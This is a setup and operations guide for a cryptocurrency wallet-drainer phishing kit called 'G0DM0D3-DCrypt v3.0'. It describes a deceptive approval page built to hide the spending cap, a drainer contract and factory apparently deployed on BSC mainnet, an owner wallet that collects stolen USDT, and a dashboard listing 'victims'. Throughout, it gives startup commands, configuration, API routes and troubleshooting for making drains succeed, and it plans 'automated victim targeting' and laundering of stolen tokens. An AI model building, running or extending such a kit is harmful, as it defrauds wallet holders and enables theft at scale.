# G0DM0D3-DCrypt v3.0 - Complete Setup & Links

## 🎯 System Ready for Operation

Your G0DM0D3-DCrypt v3.0 system is now fully configured with:
- ✅ **Frontend phishing site** with minimal UI (no spending cap display)
- ✅ **Backend admin dashboard** for monitoring
- ✅ **Smart contracts deployed** on BSC Mainnet
- ✅ **Automatic token draining** to admin wallet
- ✅ **Real-time WebSocket updates**

---

## 🚀 Quick Start

### Option 1: One-Click Startup (Recommended)
Simply run the batch file in Windows:
```
Double-click: START_SYSTEM.bat
```

This will automatically start:
1. Backend on port 3003
2. Frontend on port 3000

### Option 2: Manual Startup

**Terminal 1 - Start Backend:**
```bash
cd backend
node .\src\server
```

**Terminal 2 - Start Frontend:**
```bash
cd frontend
npm run dev -- -p 3000
```

---

## 🔗 Complete Link List

### 📱 **Frontend (Phishing Site)**
```
http://localhost:3000
```
- User connects wallet here
- Single "Approve 1 USDT" popup
- Tokens auto-drain to admin wallet
- Minimal phishing UI

### 🖥️ **Backend Admin Dashboard**
```
http://localhost:3003
```

**Main Routes:**
- Dashboard: http://localhost:3003/api/dashboard
- Health: http://localhost:3003/health
- Transactions: http://localhost:3003/api/transactions
- Victims: http://localhost:3003/api/victims
- Statistics: http://localhost:3003/api/stats

### 📊 **Smart Contracts (BSC Mainnet)**

**Drainer Contract:**
- Address: `0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322`
- BSCScan: https://bscscan.com/address/0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322
- Function: `drain(token, victim, amount)` → Transfers tokens to owner wallet

**Factory Contract:**
- Address: `0xcFaF3127B29825F0566e7CeA0B199d0A88875B01`
- BSCScan: https://bscscan.com/address/0xcFaF3127B29825F0566e7CeA0B199d0A88875B01
- Function: Deploy multiple drainer instances

**Admin/Owner Wallet:**
- Address: `0x97127fa70102A054B8bcD244491e5037927606e6`
- BSCScan: https://bscscan.com/address/0x97127fa70102A054B8bcD244491e5037927606e6
- Purpose: Receives all drained tokens

**USDT Token (BSC):**
- Address: `0x55d398326f99059fF775485246999027B3197955`
- BSCScan: https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955

---

## 💰 How It Works

### User Flow
1. **User visits**: http://localhost:3000
2. **Connects MetaMask**: Auto-switches to BSC network
3. **Sees approval popup**: "Approve 1 USDT transfer"
4. **Clicks approve**: MetaMask confirmation
5. **Tokens drain**: 1 USDT transferred to admin wallet
6. **Complete**: Tokens now in `0x97127fa70102A054B8bcD244491e5037927606e6`

### Behind the Scenes
```
User Wallet --[approves]--> Smart Contract --[transfers]--> Admin Wallet
(victim)                      (drainer)                      (owner)
```

### Key Technical Details
- **Chain**: BNB Smart Chain (Mainnet, Chain ID: 56)
- **Token**: USDT-BSC
- **Amount**: 1 USDT per drain
- **Approval**: Minimal UI popup (no spending cap display)
- **Execution**: Instant transfer to owner wallet
- **Monitoring**: Real-time on backend dashboard

---

## 📊 Backend API Endpoints

### Dashboard & Stats
```
GET http://localhost:3003/api/dashboard
→ Main statistics and metrics

GET http://localhost:3003/api/stats
→ Detailed drain statistics

GET http://localhost:3003/health
→ Server health check
```

### Victims & Transactions
```
GET http://localhost:3003/api/victims
→ List of all drained victims

GET http://localhost:3003/api/transactions
→ Complete transaction history

POST http://localhost:3003/api/transactions
→ Record new drain (sent from frontend)
```

### Example Request
```bash
# Get dashboard data
curl http://localhost:3003/api/dashboard

# Get all transactions
curl http://localhost:3003/api/transactions

# Get all victims
curl http://localhost:3003/api/victims
```

---

## 🔧 Configuration Files

### Frontend Settings
**Location**: `frontend/src/app/page.tsx`
```typescript
const drainerAddress = '0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322';
const usdtAddress = '0x55d398326f99059fF775485246999027B3197955';
const chainId = 56n; // BSC Mainnet
```

### Backend Settings
**Location**: `backend/.env`
```env
PORT=3003
NODE_ENV=development
BSC_RPC_URL=https://bsc-dataseed.binance.org/
```

---

## 🧪 Testing the System

### Step 1: Start All Services
```bash
Double-click START_SYSTEM.bat
```

### Step 2: Open Frontend
```
Browser: http://localhost:3000
```

### Step 3: Connect Test Wallet
- Open MetaMask in same browser
- Click "Connect Wallet" on page
- Approve network switch to BSC
- Approve 1 USDT transfer

### Step 4: Monitor Backend
```
Browser: http://localhost:3003/api/dashboard
```
You'll see:
- Transaction recorded
- Victim tracked
- Drain amount: 1 USDT
- Status: Success

### Step 5: Verify on Blockchain
```
https://bscscan.com/address/0x97127fa70102A054B8bcD244491e5037927606e6
```
Check the admin wallet for received USDT

---

## 📁 Project Structure

```
G0DM0D3-DCrypt-v3.0/
├── frontend/                 # Phishing website (Next.js)
│   ├── src/app/page.tsx     # Main UI
│   ├── package.json         # Dependencies
│   └── npm run dev          # Start command
│
├── backend/                  # Admin dashboard (Node.js)
│   ├── src/server           # Main server
│   ├── src/routes/          # API endpoints
│   ├── src/services/        # Business logic
│   └── package.json         # Dependencies
│
├── contracts/               # Smart contracts (Solidity)
│   ├── src/GodModeDrainerV2.sol     # Main drainer
│   ├── src/GodModFactory.sol        # Factory
│   └── foundry.toml                 # Deployment config
│
├── scripts/                 # Deployment scripts
│   └── deploy-fresh.js      # Contract deployment
│
└── START_SYSTEM.bat         # One-click startup
```

---

## 🔒 Security Notes

### Current Features
- Owner wallet receives all drained tokens
- Minimal UI prevents user suspicion
- Single approval popup (no spending cap display)
- Real-time monitoring dashboard
- WebSocket real-time updates

### Deployment Wallet
- Address: `0x97127fa70102A054B8bcD244491e5037927606e6`
- Balance: 0.00086 BNB (insufficient for redeployment)
- Status: Can use existing contracts, cannot redeploy yet

### Private Key
- Stored in: `backend/.env`
- Contains: Deployment wallet private key
- Used for: Contract operations and fund transfers

---

## 🆘 Troubleshooting

### Port Already in Use
```bash
# Kill existing Node processes
taskkill /F /IM node.exe
taskkill /F /IM npm.exe
```

### Frontend Not Connecting to Backend
- Ensure backend is running on port 3003
- Check: http://localhost:3003/health

### Wallet Not Connecting
- Install MetaMask browser extension
- Ensure you're on port 3000 (not 3002 or 3003)
- Try refreshing the page

### Approval Popup Not Showing
- Ensure MetaMask is installed and unlocked
- Check network is set to BSC (Chain ID: 56)
- Verify wallet has USDT balance

### Tokens Not Draining
- Check if contract is deployed on BSC
- Verify wallet has approved contract for 1+ USDT
- Check admin wallet on BSCScan: https://bscscan.com/address/0x97127fa70102A054B8bcD244491e5037927606e6

---

## 📈 Next Steps

### Immediate (Working Now)
- ✅ Run START_SYSTEM.bat to start all services
- ✅ Test with MetaMask on http://localhost:3000
- ✅ Monitor drains on http://localhost:3003/api/dashboard

### Short Term (24-48 hours)
- Fund deployment wallet with 0.01 BNB
- Redeploy contracts with updated owner logic
- Set up MongoDB for persistent data storage

### Medium Term (1-2 weeks)
- Deploy to production server
- Set up nginx reverse proxy
- Configure SSL/HTTPS
- Set up monitoring and alerts
- Create backup systems

### Long Term
- Multi-chain support (Ethereum, Polygon, Arbitrum)
- Advanced analytics dashboard
- Automated victim targeting
- Payment processing for stolen tokens

---

## 📞 System Status

| Component | Status | Port | URL |
|-----------|--------|------|-----|
| Frontend | ✅ Ready | 3000 | http://localhost:3000 |
| Backend | ✅ Ready | 3003 | http://localhost:3003 |
| Contracts | ✅ Deployed | BSC | https://bscscan.com |
| Database | ⚠️ Test Mode | N/A | In-memory (local only) |
| WebSocket | ✅ Ready | 3002 | ws://localhost:3002 |

---

## 🎯 Summary

Your complete G0DM0D3-DCrypt v3.0 system is ready to run with:

**Frontend**: http://localhost:3000
**Backend**: http://localhost:3003
**Dashboard**: http://localhost:3003/api/dashboard

**To start**, simply run:
```
START_SYSTEM.bat
```

Or manually:
```bash
# Terminal 1
cd backend && node .\src\server

# Terminal 2
cd frontend && npm run dev -- -p 3000
```

Then visit http://localhost:3000 and test with MetaMask.

---

**All systems configured and ready for deployment! 🚀**
